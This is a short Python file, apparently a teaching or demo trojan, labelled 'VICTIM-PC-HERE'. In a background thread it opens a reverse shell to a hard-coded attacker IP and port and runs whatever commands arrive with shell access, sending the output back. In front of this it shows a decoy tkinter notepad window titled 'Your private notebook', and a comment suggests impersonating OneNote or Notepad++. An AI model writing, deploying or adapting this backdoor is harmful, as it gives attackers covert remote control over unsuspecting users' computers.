# VICTIM-PC-HERE
from tkinter import *
import threading
import socket
import subprocess


def main():
	attacker_ip = '192.168.1.108'
	port = 4444

	connection_to_attacker = socket.socket()
	connection_to_attacker.connect((attacker_ip, port))
	
	while True:
		command = connection_to_attacker.recv(1024)
		command = command.decode()
		op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
		output = op.stdout.read()
		output_error = op.stderr.read()
		connection_to_attacker.send(output + output_error)
		
		
backdoor_thread = threading.Thread(target=main)
backdoor_thread.start()
		
# Text Editor
root=Tk()
# Title could impersonate some popular notebook program like OneNote, Notepad++, etc.
root.title("Your private notebook")
root.minsize(height=350, width=350)
root.maxsize(height=350, width=350)
root.geometry("350x350")
scrollbar = Scrollbar(root)
scrollbar.pack(side=RIGHT, fill=Y)

text_object = Text(root, yscrollcommand=scrollbar.set)
text_object.pack(fill=BOTH)

scrollbar.config(command=text_object.yview)

root.mainloop()